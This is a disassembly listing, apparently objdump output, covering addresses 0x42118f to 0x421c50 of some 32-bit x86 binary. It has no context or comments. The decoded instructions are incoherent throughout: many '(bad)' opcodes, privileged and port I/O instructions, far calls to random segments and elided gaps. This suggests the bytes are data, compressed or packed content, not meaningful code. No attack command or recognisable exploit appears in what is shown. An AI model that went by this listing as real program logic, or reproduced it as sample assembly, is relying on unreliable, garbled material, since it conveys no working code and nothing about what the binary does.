  42118f:	add    dh,BYTE PTR [ecx-0x59eb1977]
  421195:	seto   cl
  421198:	add    ebp,DWORD PTR [esi]
  42119a:	jo     0x421152
  42119c:	aas    
  42119d:	sub    ch,BYTE PTR [edi+0x72a51d2c]
  4211a3:	mov    BYTE PTR [edi+ecx*2-0x71],0xbe
  4211a8:	loopne 0x4211b5
  4211aa:	xchg   ebp,eax
  4211ab:	daa    
  4211ac:	aam    0x19
  4211ae:	push   edi
  4211af:	sbb    ebx,DWORD PTR [ebx]
  4211b1:	or     edx,esp
  4211b3:	jmp    0x42120a
  4211b5:	hlt    
  4211b6:	imul   edi,DWORD PTR [eax-0x131fb87c],0x823661a9
  4211c0:	mov    bh,0xfc
  4211c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211c3:	lds    esp,FWORD PTR [ecx]
  4211c5:	mov    al,ds:0xcb17680b
  4211ca:	or     eax,0xbece47d9
  4211cf:	shr    DWORD PTR [ebp+0x54a2f9e8],1
  4211d5:	into   
  4211d6:	pop    eax
  4211d7:	mov    bh,BYTE PTR [ebx+ecx*4]
  4211da:	cdq    
  4211db:	cmp    esp,ebp
  4211dd:	imul   ebx,esi,0xd063d023
  4211e3:	sbb    eax,0x71bbf9f8
  4211e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211e9:	cmc    
  4211ea:	add    BYTE PTR ds:0xd21bcc5d,cl
  4211f0:	sti    
  4211f1:	pushf  
  4211f2:	(bad)  
  4211f3:	cdq    
  4211f4:	(bad)  
  4211f5:	fnstsw WORD PTR [eax]
  4211f7:	call   0x3688:0xd86b9657
  4211fe:	pop    esi
  4211ff:	ds push cs
  421201:	push   0x3799f06f
  421206:	fdivr  st,st(6)
  421208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421209:	jmp    0x4211df
  42120b:	xchg   DWORD PTR [edi+ecx*2+0x3b6175],edx
	...
  421272:	add    BYTE PTR [eax],al
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0x197ab32d
  421281:	jbe    0x4212d6
  421283:	(bad)  
  421284:	popf   
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0x40000001
  42128d:	jge    0x421250
  42128f:	in     al,0xfb
  421291:	and    eax,0x2bf0db0f
  421296:	fwait
  421297:	dec    eax
  421298:	xchg   ebp,eax
  421299:	sbb    DWORD PTR [edx*2-0x3b7cb644],0x5a
  4212a1:	mov    edi,DWORD PTR [ecx-0x47dafac8]
  4212a7:	mov    ebp,0x744629f2
  4212ac:	and    eax,0xc8b2cb93
  4212b1:	jb     0x421325
  4212b3:	inc    eax
  4212b4:	sub    bh,cl
  4212b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212b7:	dec    esi
  4212b8:	sbb    esp,DWORD PTR ds:0x46d56007
  4212be:	stos   BYTE PTR es:[edi],al
  4212bf:	cmp    eax,DWORD PTR [edi-0x6863f2e4]
  4212c5:	and    eax,0xc2981d60
  4212ca:	rol    ah,cl
  4212cc:	sub    eax,0x474ea234
  4212d1:	adc    BYTE PTR [ebx-0x24],ah
  4212d4:	push   esi
  4212d5:	mov    esi,0x7bf0f6c3
  4212da:	arpl   WORD PTR [si],si
  4212dd:	push   ebp
  4212de:	add    bh,dh
  4212e0:	je     0x42132e
  4212e2:	test   al,0xb6
  4212e4:	xchg   edi,eax
  4212e5:	jno    0x421365
  4212e7:	test   al,0x14
  4212e9:	pop    esi
  4212ea:	retf   
  4212eb:	pop    ebp
  4212ec:	cmp    ch,BYTE PTR [edi-0x6425198a]
  4212f2:	lds    esi,FWORD PTR [ebx+0x23]
  4212f5:	add    al,0xa5
  4212f7:	iret   
  4212f8:	pop    ebp
  4212f9:	push   ecx
  4212fa:	into   
  4212fb:	dec    eax
  4212fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212fd:	inc    edi
  4212fe:	push   ds
  4212ff:	push   es
  421300:	ds inc edx
  421302:	sahf   
  421303:	mov    esi,0xe4c5bbb8
  421308:	das    
  421309:	mov    ebx,0x9bf7d79
  42130e:	and    DWORD PTR [esi-0x5166fc4a],0x78
  421315:	and    esi,DWORD PTR [ebp*4+0x6fc7c4ae]
  42131c:	pusha  
  42131d:	sub    eax,0xc629b50b
  421322:	fcom   DWORD PTR [eax]
  421324:	mov    ds:0x6def2d34,eax
  421329:	jae    0x4213a0
  42132b:	in     eax,dx
  42132c:	bound  edx,QWORD PTR [ecx*4+0x77e2c028]
  421333:	mov    ds:0xbba50665,al
  421338:	jg     0x4213ab
  42133a:	jg     0x4212e9
  42133c:	xchg   edi,eax
  42133d:	(bad)  [ebx-0x2434fa6c]
  421343:	jg     0x42138e
  421345:	into   
  421346:	cmp    DWORD PTR [ebx+0x8965ef1],ebx
  42134c:	mov    ebx,DWORD PTR [edx+0x20]
  42134f:	cld    
  421350:	dec    ecx
  421351:	and    eax,0xbf874bb3
  421356:	mov    DWORD PTR [edx],ebx
  421358:	in     al,0x2a
  42135a:	inc    ebp
  42135b:	lock or al,BYTE PTR [ebx]
  42135e:	neg    DWORD PTR [esi+0x62ac604b]
  421364:	mov    bh,0xd2
  421366:	mov    bh,0x1d
  421368:	or     edx,DWORD PTR [ecx+0x6e608d4c]
  42136e:	cmp    DWORD PTR ds:0x237593d6,ecx
  421374:	sub    bp,WORD PTR [edx]
  421377:	test   eax,0x8525c8e2
  42137c:	mov    cl,0x76
  42137e:	loop   0x421357
  421380:	sbb    DWORD PTR [edi+0x4b],edi
  421383:	add    esi,0xffffff91
  421386:	nop
  421387:	sbb    DWORD PTR [ebx+0x1],ecx
  42138a:	scas   eax,DWORD PTR es:[edi]
  42138b:	and    DWORD PTR ds:0x21f57ced,0x0
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x3fb60b61]
  421402:	pusha  
  421403:	(bad)  
  421404:	mov    ds:0x5000162,al
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    ah,al
  42140d:	mov    ds:0xbb4c6002,al
  421412:	mov    ebp,0xa66eae17
  421417:	mov    cl,0x41
  421419:	mov    ecx,0xc1fdaca6
  42141e:	jmp    0x70cf4bd5
  421423:	adc    DWORD PTR [eax+edx*4],ebp
  421426:	test   al,0x35
  421428:	mov    ds:0x5145be74,eax
  42142d:	in     al,dx
  42142e:	mov    edx,0xf088f6dd
  421433:	push   0x44
  421435:	push   ss
  421436:	pop    esp
  421437:	jmp    0x42146e
  421439:	xchg   DWORD PTR [edx],ebp
  42143b:	(bad)  
  42143c:	sti    
  42143d:	out    dx,eax
  42143e:	xchg   edi,eax
  42143f:	enter  0x681e,0xe3
  421443:	outs   dx,BYTE PTR ds:[esi]
  421444:	cmc    
  421445:	(bad)  
  421447:	cmc    
  421448:	mov    bl,0xcd
  42144a:	jl     0x421472
  42144c:	sub    BYTE PTR [edx],dh
  42144e:	jae    0x421492
  421450:	inc    eax
  421451:	pop    ebx
  421452:	push   0x5c768bdd
  421457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421458:	add    esp,edx
  42145a:	ins    BYTE PTR es:[edi],dx
  42145b:	les    esi,FWORD PTR [ebx+0x408545f8]
  421461:	fs cli 
  421463:	repz xor eax,0x1ce94366
  421469:	cli    
  42146a:	call   0x5df040e7
  42146f:	sub    cl,BYTE PTR [eax]
  421471:	test   al,0xa6
  421473:	push   esp
  421474:	ja     0x4214af
  421476:	inc    edx
  421477:	es push cs
  421479:	jns    0x4213fc
  42147b:	cmp    dh,BYTE PTR [ebx]
  42147d:	cmp    BYTE PTR [eax+eiz*1+0x798bac54],ch
  421484:	add    eax,0x6c64683b
  421489:	jbe    0x421435
  42148b:	jl     0x42145a
  42148d:	add    DWORD PTR [edx],esi
  42148f:	mov    bh,0xe7
  421491:	dec    eax
  421492:	dec    eax
  421493:	call   0xd72a:0x3c95d81a
  42149a:	mov    dl,0xd4
  42149c:	hlt    
  42149d:	pop    edi
  42149e:	push   ecx
  42149f:	cwde   
  4214a0:	repz mov edx,0xad5bf299
  4214a6:	mov    ecx,0xba7cb799
  4214ab:	(bad)  
  4214ac:	or     esp,DWORD PTR [edi+0xe]
  4214af:	dec    edi
  4214b0:	into   
  4214b1:	out    0x5b,al
  4214b3:	cs hlt 
  4214b5:	jno    0x421514
  4214b7:	(bad)  
  4214b8:	retf   
  4214b9:	pop    ebp
  4214ba:	mov    edi,DWORD PTR [edi]
  4214bc:	cli    
  4214bd:	mov    ebp,0xa9b9c097
  4214c2:	sbb    ah,BYTE PTR [esp+ebx*1]
  4214c5:	js     0x42150e
  4214c7:	mov    dl,BYTE PTR [ebp+0x69d96409]
  4214cd:	dec    ebx
  4214ce:	xchg   DWORD PTR ds:0xd08439ee,eax
  4214d4:	inc    ebx
  4214d5:	rol    DWORD PTR [edx-0x3],0xc4
  4214d9:	cmp    cl,BYTE PTR [edi+ebp*8+0x41d3257]
  4214e0:	dec    ecx
  4214e1:	dec    edi
  4214e2:	outs   dx,DWORD PTR ds:[esi]
  4214e3:	pop    es
  4214e4:	jge    0x4214cb
  4214e6:	sbb    edi,DWORD PTR es:[esi]
  4214e9:	in     al,dx
  4214ea:	adc    edx,DWORD PTR [eax+0x2ee86bc6]
  4214f0:	nop
  4214f1:	push   ebp
  4214f2:	test   eax,0xf74efade
  4214f7:	rol    esi,0xc0
  4214fa:	test   al,0xb1
  4214fc:	iret   
  4214fd:	mov    edx,0x9131386
  421502:	push   ebp
  421503:	or     al,0xbd
  421505:	sbb    al,0x9f
  421507:	mov    edi,0xb50ad60b
  42150c:	pop    edi
  42150e:	retf   
  42150f:	mov    edi,eax
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x3e2542b4],bp
  421582:	xchg   esp,eax
  421583:	adc    al,0xa7
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0x9c000001,al
  42158d:	xor    bl,bh
  42158f:	(bad)  
  421590:	in     al,0x68
  421592:	inc    esp
  421593:	push   ecx
  421594:	add    dh,BYTE PTR cs:[ecx+0x12e0cea6]
  42159b:	shl    BYTE PTR [ebp-0x47fc5f0c],cl
  4215a1:	ss dec ecx
  4215a3:	aam    0xdc
  4215a5:	mov    es,WORD PTR ds:0xb33efadb
  4215ab:	jne    0x421615
  4215ad:	mov    ebx,0x92109445
  4215b2:	pushf  
  4215b3:	adc    esi,DWORD PTR [ebx-0x1c72380a]
  4215b9:	push   ebx
  4215ba:	sbb    ebp,ebp
  4215bc:	xchg   DWORD PTR [ecx+0x159d3bf3],edi
  4215c2:	clc    
  4215c3:	scas   al,BYTE PTR es:[edi]
  4215c4:	mov    ebx,0x74287cd5
  4215c9:	inc    ecx
  4215ca:	xor    ecx,DWORD PTR [ebx]
  4215cc:	out    0x10,eax
  4215ce:	jb     0x42155a
  4215d0:	loopne 0x421586
  4215d2:	cli    
  4215d3:	popa   
  4215d4:	and    DWORD PTR ds:0xe4d97a9b,ecx
  4215da:	fild   WORD PTR [ebx]
  4215dc:	(bad)  
  4215dd:	jmp    0x421620
  4215df:	popa   
  4215e0:	ror    ebx,0xc9
  4215e3:	stos   BYTE PTR es:[edi],al
  4215e4:	jp     0x4215e6
  4215e6:	sub    al,0xb2
  4215e8:	out    dx,al
  4215e9:	pop    esp
  4215ea:	outs   dx,DWORD PTR ds:[esi]
  4215eb:	dec    esi
  4215ec:	sub    BYTE PTR [eax],dl
  4215ee:	mov    edi,0x558b85bf
  4215f3:	popa   
  4215f4:	les    ecx,FWORD PTR [esi+0x65b57766]
  4215fa:	call   0x511a:0x50b6e2f0
  421601:	fmul   DWORD PTR ds:0xcee5ec0a
  421607:	adc    dh,BYTE PTR [eax-0xe]
  42160a:	retf   
  42160b:	pop    ss
  42160c:	push   ds
  42160d:	fmul   QWORD PTR [esi-0xc]
  421610:	dec    ecx
  421611:	icebp  
  421612:	add    al,0xb7
  421614:	aas    
  421615:	pop    eax
  421616:	mov    ds:0x510167e,eax
  42161b:	(bad)  
  42161c:	push   edx
  42161d:	xchg   ebp,eax
  42161e:	sub    ecx,eax
  421620:	pop    eax
  421621:	jns    0x4215f9
  421623:	inc    edx
  421624:	mov    bh,0x62
  421626:	sbb    DWORD PTR [ebp-0x36],0x31
  42162a:	jmp    0x4215bc
  42162c:	int    0xd3
  42162e:	and    dl,BYTE PTR [ecx-0x7f892197]
  421634:	and    ecx,esi
  421636:	iret   
  421637:	test   eax,0xf420d061
  42163c:	int    0x1d
  42163e:	inc    edi
  42163f:	jge    0x4215d7
  421641:	xchg   ebx,eax
  421642:	mov    ds:0xb07eea4e,al
  421647:	imul   edi,DWORD PTR [ecx-0x5b216be3],0x7e02de02
  421651:	jo     0x421652
  421653:	xlat   BYTE PTR ds:[ebx]
  421654:	ret    
  421655:	addr16 inc ebx
  421657:	into   
  421658:	aas    
  421659:	shl    DWORD PTR [ecx+0x3a],0xa0
  42165d:	ss and ah,ah
  421660:	inc    ecx
  421661:	cmp    BYTE PTR [edx-0x6],0xd8
  421665:	pushf  
  421666:	fwait
  421667:	call   0xad22:0x71c9d357
  42166e:	mov    dl,0xbc
  421670:	repz push ebp
  421672:	cmc    
  421673:	js     0x4216b2
  421675:	stos   BYTE PTR es:[edi],al
  421676:	ror    DWORD PTR [ecx-0x88d32cf],cl
  42167c:	(bad)  
  42167d:	loope  0x4216d2
  42167f:	sub    eax,0xbdb30405
  421684:	adc    dl,al
  421686:	inc    ebx
  421687:	adc    eax,0xd4354395
  42168c:	cld    
  42168d:	cdq    
  42168e:	in     al,0x10
  421690:	out    dx,al
	...
  4216f1:	add    BYTE PTR [eax],al
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	sub    DWORD PTR [edx],edx
  421702:	sbb    eax,0x164ac69
  421707:	add    BYTE PTR ds:0x44000001,al
  42170d:	push   esp
  42170e:	pop    esi
  42170f:	in     al,0xb3
  421711:	ds call 0x52e122c9
  421717:	mov    cl,dh
  421719:	enter  0xd9bb,0xd2
  42171d:	adc    al,0x63
  42171f:	push   ds
  421720:	mov    eax,0xf115f36a
  421725:	or     eax,0x8504a884
  42172a:	frstor [eax+0x65216979]
  421730:	in     al,0x4d
  421732:	outs   dx,DWORD PTR ds:[esi]
  421733:	jle    0x4216e2
  421735:	mov    ah,0x5d
  421737:	stos   BYTE PTR es:[edi],al
  421738:	pop    ss
  421739:	call   0xcaac703b
  42173e:	xchg   edi,eax
  42173f:	jmp    0x7c8:0xd2dcb4c8
  421746:	dec    DWORD PTR [ecx+0x3ba0c21e]
  42174c:	pop    es
  42174d:	dec    eax
  42174e:	(bad)  
  42174f:	int3   
  421750:	push   0x33
  421752:	daa    
  421753:	sbb    ah,bh
  421755:	pop    edx
  421756:	pop    ds
  421757:	mov    edi,es
  421759:	aad    0x9b
  42175b:	adc    ebp,DWORD PTR [ebx]
  42175d:	xchg   ebp,eax
  42175e:	daa    
  42175f:	aad    0x82
  421761:	dec    ebx
  421762:	mov    cl,0x2e
  421764:	fmul   DWORD PTR [edi]
  421766:	xor    al,0xd
  421768:	mov    ebx,0x62d8a3aa
  42176d:	les    edi,FWORD PTR [ecx]
  42176f:	call   0x3d6b2403
  421774:	push   esp
  421775:	bound  eax,QWORD PTR gs:[edx-0x4b]
  421779:	in     al,dx
  42177a:	xor    eax,0xd6dfbb0b
  42177f:	xor    cl,BYTE PTR [eax+0x3584925c]
  421785:	jmp    0x4217b3
  421787:	mov    cl,0x88
  421789:	pop    edi
  42178a:	cmp    dh,BYTE PTR [ebx]
  42178c:	cmc    
  42178d:	mov    ebp,0x1a1e0250
  421792:	inc    edi
  421793:	jg     0x4217f5
  421795:	inc    ecx
  421796:	call   0xe64a:0x10e99aae
  42179d:	inc    eax
  42179e:	ds dec edi
  4217a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217a1:	or     DWORD PTR [ebx+0x1c],edi
  4217a4:	pop    ebx
  4217a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217a6:	popf   
  4217a7:	xchg   DWORD PTR [eax-0x7a],edx
  4217aa:	inc    ebx
  4217ab:	xchg   edi,eax
  4217ac:	fwait
  4217ad:	pop    ebx
  4217ae:	mov    al,cl
  4217b0:	jb     0x4217fc
  4217b2:	scas   eax,DWORD PTR es:[edi]
  4217b3:	xchg   DWORD PTR [edi-0x12fc1a85],edi
  4217b9:	mov    dh,0x75
  4217bb:	bound  edx,QWORD PTR [edi+eax*4+0x75b09703]
  4217c2:	dec    ecx
  4217c3:	and    esp,esp
  4217c5:	adc    BYTE PTR [ebx+ebp*2],0xac
  4217c9:	mov    bl,0x2
  4217cb:	outs   dx,BYTE PTR ds:[esi]
  4217cc:	repz rcr ecx,0xbb
  4217d0:	outs   dx,DWORD PTR ds:[esi]
  4217d1:	jns    0x421852
  4217d3:	and    cl,BYTE PTR [ecx-0x2c]
  4217d6:	pop    es
  4217d7:	fadd   DWORD PTR [esi]
  4217d9:	pop    edx
  4217da:	ja     0x421838
  4217dc:	loopne 0x4217fd
  4217de:	iret   
  4217df:	sahf   
  4217e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217e1:	mov    ds:0x85527386,al
  4217e6:	adc    ecx,DWORD PTR [ebx]
  4217e8:	mov    dl,0xbe
  4217ea:	call   0x7ebd233f
  4217ef:	cld    
  4217f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217f1:	shr    ah,1
  4217f3:	xor    al,0xe8
  4217f5:	add    DWORD PTR [esi+0x16d1cd8f],0xdd517123
  4217ff:	dec    ebp
  421800:	pop    ebp
  421801:	je     0x42185a
  421803:	pop    ebx
  421804:	retf   
  421805:	adc    dh,BYTE PTR [ebx-0x697096ef]
  42180b:	inc    esp
  42180c:	mov    al,0x86
  42180e:	les    ecx,FWORD PTR [eax]
  421810:	or     eax,DWORD PTR [eax]
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	(bad)  
  421881:	cli    
  421882:	mov    ecx,DWORD PTR [eax]
  421884:	mov    cl,0x65
  421886:	add    DWORD PTR [eax],eax
  421888:	add    eax,0xc4000001
  42188d:	sub    al,0x6c
  42188f:	dec    ebx
  421890:	ficom  WORD PTR [edi+ecx*1-0x4799929e]
  421897:	pop    ebp
  421898:	push   edx
  421899:	les    edi,FWORD PTR [eax]
  42189b:	xor    DWORD PTR [edx],ecx
  42189d:	repnz or dh,ch
  4218a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218a1:	xor    eax,0xdab22077
  4218a6:	in     al,dx
  4218a7:	xor    eax,0xf36186b1
  4218ac:	mov    ebx,0x7bd79ead
  4218b1:	mov    al,0x5c
  4218b3:	xor    BYTE PTR [ebp-0x53ba4bd1],ah
  4218b9:	mov    esp,0xfbc90ac7
  4218be:	(bad)
  4218c1:	cdq    
  4218c2:	jle    0x4218eb
  4218c4:	inc    ebp
  4218c5:	xchg   esp,eax
  4218c6:	mov    ch,bl
  4218c8:	scas   eax,DWORD PTR es:[edi]
  4218c9:	jnp    0x421942
  4218cb:	fwait
  4218cc:	sahf   
  4218cd:	mov    esi,0x7825480f
  4218d2:	outs   dx,BYTE PTR ds:[esi]
  4218d3:	lahf   
  4218d4:	sahf   
  4218d5:	xchg   esp,eax
  4218d6:	lea    edx,[eax-0x6b25da4b]
  4218dc:	cld    
  4218dd:	xor    eax,0xa657cf75
  4218e2:	sti    
  4218e3:	div    DWORD PTR [edi+0x2c]
  4218e6:	pusha  
  4218e7:	(bad)  
  4218e8:	jmp    0x421967
  4218ea:	and    eax,0x740a96a1
  4218ef:	ss or  edx,ecx
  4218f2:	scas   eax,DWORD PTR es:[edi]
  4218f3:	dec    edi
  4218f4:	jae    0x4218cd
  4218f6:	shl    dh,0xf3
  4218f9:	addr16 out 0xe3,al
  4218fc:	mov    ds:0x31e2f767,al
  421901:	sbb    eax,0x7c5545d5
  421906:	adc    BYTE PTR [edx-0x2ba783e1],0x34
  42190d:	mov    esi,0x5995cefd
  421912:	pushf  
  421913:	push   ebp
  421914:	and    ecx,DWORD PTR [eax-0x57a55100]
  42191a:	ins    DWORD PTR es:[edi],dx
  42191b:	pop    ebx
  42191c:	cli    
  42191d:	xor    bh,BYTE PTR [ebp-0x2d]
  421920:	and    ecx,DWORD PTR [ecx+eax*1]
  421923:	mov    edi,0xabe64aba
  421928:	push   edi
  421929:	xchg   ebp,eax
  42192a:	or     edx,DWORD PTR [edi-0x19]
  42192d:	(bad)  
  42192e:	fld    QWORD PTR [edi]
  421930:	mov    eax,0x21bb48a8
  421935:	daa    
  421936:	xchg   esp,eax
  421937:	fld    QWORD PTR [ebp-0x4]
  42193a:	xchg   ecx,eax
  42193b:	in     eax,0x28
  42193d:	rcr    BYTE PTR [ebx],0x3e
  421940:	lahf   
  421941:	js     0x421977
  421943:	mov    cl,0x77
  421945:	clc    
  421946:	or     edi,0xffffff8f
  421949:	loopne 0x421923
  42194b:	and    DWORD PTR [ebp-0x2],edi
  42194e:	add    eax,0x9de803cb
  421953:	push   ds
  421954:	push   0x96c63a76
  421959:	or     eax,0x936a4584
  42195e:	push   edx
  42195f:	adc    al,0x77
  421961:	shr    edx,0xcc
  421964:	sbb    DWORD PTR [ecx-0x6c11ab20],edx
  42196a:	(bad)  
  42196b:	pop    edi
  42196c:	jge    0x4218fc
  42196e:	test   BYTE PTR [edx+0x1cdbffec],cl
  421974:	shl    bh,1
  421976:	fcomp  st(0)
  421978:	pop    ecx
  421979:	dec    esp
  42197a:	and    BYTE PTR [esi-0x69cf56cf],bh
  421980:	pop    edx
  421981:	pushf  
  421982:	and    BYTE PTR es:[ecx],ch
  421985:	and    BYTE PTR [edx],ah
  421987:	xor    al,0x50
  421989:	dec    ebp
  42198a:	push   ecx
  42198b:	xchg   esp,eax
  42198c:	add    dh,0xff
  42198f:	enter  0x78,0x0
	...
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	daa    
  421a01:	(bad)  
  421a02:	sbb    al,0x6f
  421a04:	mov    dh,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    eax,0xcc000001
  421a0d:	sub    dl,cl
  421a0f:	mul    BYTE PTR [edx+0x2b]
  421a12:	sbb    bh,BYTE PTR [ecx+0x19fc3761]
  421a18:	in     eax,0x15
  421a1a:	lahf   
  421a1b:	mov    ebx,0x33d73f6
  421a20:	jnp    0x421a6b
  421a22:	test   eax,0xaaccf3c5
  421a27:	call   0xf8b5:0x250a970
  421a2e:	sar    BYTE PTR [eax-0x71],1
  421a31:	(bad)  [edx-0x5c]
  421a34:	addr16 ret 
  421a36:	fs pop eax
  421a38:	pop    ds
  421a39:	rol    DWORD PTR [ebx-0x1e12f8f4],0x64
  421a40:	adc    BYTE PTR [ecx-0x56],dl
  421a43:	inc    edi
  421a44:	sub    ah,BYTE PTR [bp+di+0x28df]
  421a49:	out    dx,eax
  421a4a:	ret    0x29ea
  421a4d:	pushf  
  421a4e:	push   0x78
  421a50:	jb     0x421a4b
  421a52:	jmp    0xd600cac6
  421a57:	sub    ecx,edx
  421a59:	push   eax
  421a5a:	sub    al,0x20
  421a5c:	mov    bl,0xe9
  421a5e:	fld    TBYTE PTR [ebx+0x68]
  421a61:	gs cmc 
  421a63:	sub    ch,BYTE PTR [edi]
  421a65:	pop    ebx
  421a66:	inc    ebx
  421a67:	stc    
  421a68:	ss sub al,0x47
  421a6b:	mov    BYTE PTR [ebp-0x3b],dl
  421a6e:	cld    
  421a6f:	hlt    
  421a70:	pop    ss
  421a71:	sbb    BYTE PTR [edi+0x1a5a01c4],ch
  421a77:	mov    ecx,0x23e8a624
  421a7c:	or     BYTE PTR [ebp-0x42],al
  421a7f:	mov    ecx,0x452d1e82
  421a84:	(bad)  
  421a85:	add    BYTE PTR [esi],bh
  421a87:	mov    ecx,0x62b16f95
  421a8d:	mov    ebp,0x362dbb79
  421a92:	test   ch,ch
  421a94:	jo     0x421a5b
  421a96:	mov    ebx,0x7126dd88
  421a9b:	imul   DWORD PTR [esi-0x1b]
  421a9e:	and    eax,0xf3109d84
  421aa3:	rcr    BYTE PTR ds:0x26b1eeb8,1
  421aa9:	cmp    BYTE PTR [ebx],dh
  421aab:	rol    DWORD PTR [ebx+0x5abd4b58],cl
  421ab1:	out    dx,al
  421ab2:	imul   esp,DWORD PTR [edi-0xd],0x89e919b3
  421ab9:	fstp   TBYTE PTR [esi-0x59ac5295]
  421abf:	mov    edi,0x37bcd69
  421ac4:	inc    ebx
  421ac5:	sbb    al,0xf0
  421ac7:	mov    ds:0xfcec0102,al
  421acc:	dec    edx
  421acd:	aam    0x23
  421acf:	test   al,0x75
  421ad1:	jecxz  0x421a89
  421ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ad4:	or     DWORD PTR [ebx],esi
  421ad6:	hlt    
  421ad7:	xor    edx,DWORD PTR [ecx+0x56fffe97]
  421add:	push   esi
  421ade:	fcomp  QWORD PTR [esi+edi*2+0x56cca1cd]
  421ae5:	adc    ecx,DWORD PTR [esi+0x45]
  421ae8:	mov    ah,0x0
  421aea:	hlt    
  421aeb:	xor    BYTE PTR [esp+ebp*8],al
  421aee:	hlt    
  421aef:	mov    esi,edx
  421af1:	inc    esi
  421af2:	push   es
  421af3:	pop    es
  421af4:	jmp    0xca6dbca9
  421af9:	jecxz  0x421b3c
  421afb:	mov    ebx,0x9e282768
  421b00:	or     DWORD PTR [edi+0x50a69431],esi
  421b06:	push   ebp
  421b07:	retf   0xe65a
  421b0a:	fstp   TBYTE PTR ds:0x140e3fdb
  421b10:	add    BYTE PTR cs:[eax],al
	...
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     bl,BYTE PTR [eax+0x16]
  421b82:	xchg   esp,eax
  421b83:	or     DWORD PTR [ebx+0x5000167],edi
  421b89:	add    DWORD PTR [eax],eax
  421b8b:	add    ah,cl
  421b8d:	xchg   edx,eax
  421b8e:	sbb    eax,0xe1871015
  421b93:	idiv   bl
  421b95:	lea    edi,gs:[edi]
  421b98:	stos   DWORD PTR es:[edi],eax
  421b99:	clc    
  421b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b9b:	sub    eax,DWORD PTR [edx]
  421b9d:	jae    0x421b66
  421b9f:	in     al,dx
  421ba0:	sbb    al,0x24
  421ba2:	mov    edi,0x61bdcec4
  421ba7:	dec    ebx
  421ba8:	ret    0xac6c
  421bab:	retf   
  421bac:	xlat   BYTE PTR ds:[ebx]
  421bad:	fistp  WORD PTR [esi]
  421baf:	mov    dl,dh
  421bb1:	fs (bad) 
  421bb3:	out    0xbf,eax
  421bb5:	aaa    
  421bb6:	sub    edx,DWORD PTR [eax-0x1e]
  421bb9:	jp     0x421c18
  421bbb:	stos   BYTE PTR es:[edi],al
  421bbc:	fidivr DWORD PTR [ebp-0x6]
  421bbf:	icebp  
  421bc0:	scas   al,BYTE PTR es:[edi]
  421bc1:	mov    eax,DWORD PTR [edi-0x10577d]
  421bc7:	xor    ah,0x4a
  421bca:	or     eax,0xb0581948
  421bcf:	push   0xd40bf2fd
  421bd4:	xchg   ebx,eax
  421bd5:	and    DWORD PTR [ebp-0x36],0x32abf84
  421bdc:	push   0xffffffab
  421bde:	sub    bh,BYTE PTR [ebx]
  421be0:	ret    
  421be1:	(bad)  
  421be2:	jge    0x421bcb
  421be4:	das    
  421be5:	dec    eax
  421be6:	mov    WORD PTR [eax-0x6],gs
  421be9:	push   esi
  421bea:	fwait
  421beb:	xchg   ecx,eax
  421bec:	pop    edi
  421bed:	cmp    dl,BYTE PTR [ecx+0x14]
  421bf0:	cwde   
  421bf1:	mov    al,ds:0xdc056d4d
  421bf6:	add    esp,DWORD PTR [edi+0x4617b53c]
  421bfc:	fst    st(6)
  421bfe:	(bad)  
  421bff:	cmp    edi,DWORD PTR [edx]
  421c01:	jle    0x421bc4
  421c03:	jmp    0x421bf0
  421c05:	popf   
  421c06:	imul   DWORD PTR [ebp-0x2e]
  421c09:	sub    al,BYTE PTR [esi+0x4ad1d5b8]
  421c0f:	into   
  421c10:	push   es
  421c11:	and    BYTE PTR [esi+0x67379851],0x4a
  421c18:	sti    
  421c19:	ja     0x421ba6
  421c1b:	sbb    edx,DWORD PTR [eax-0xf79e56c]
  421c21:	jmp    0x8eb03118
  421c26:	and    DWORD PTR [edx-0x398bf0ee],0x4b
  421c2d:	pop    ss
  421c2e:	inc    esi
  421c2f:	das    
  421c30:	ds or  eax,edx
  421c33:	popf   
  421c34:	call   0x1317:0x7ff70780
  421c3b:	inc    ecx
  421c3c:	mov    al,ds:0xfcbc315c
  421c41:	test   bl,bl
  421c43:	xchg   ecx,eax
  421c44:	push   ss
  421c45:	mov    esi,0x35cfb98d
  421c4a:	pop    edi
  421c4b:	push   edx
  421c4c:	jg     0x421be3
  421c4e:	mov    ecx,DWORD PTR [esi]
  421c50:	pop    ss
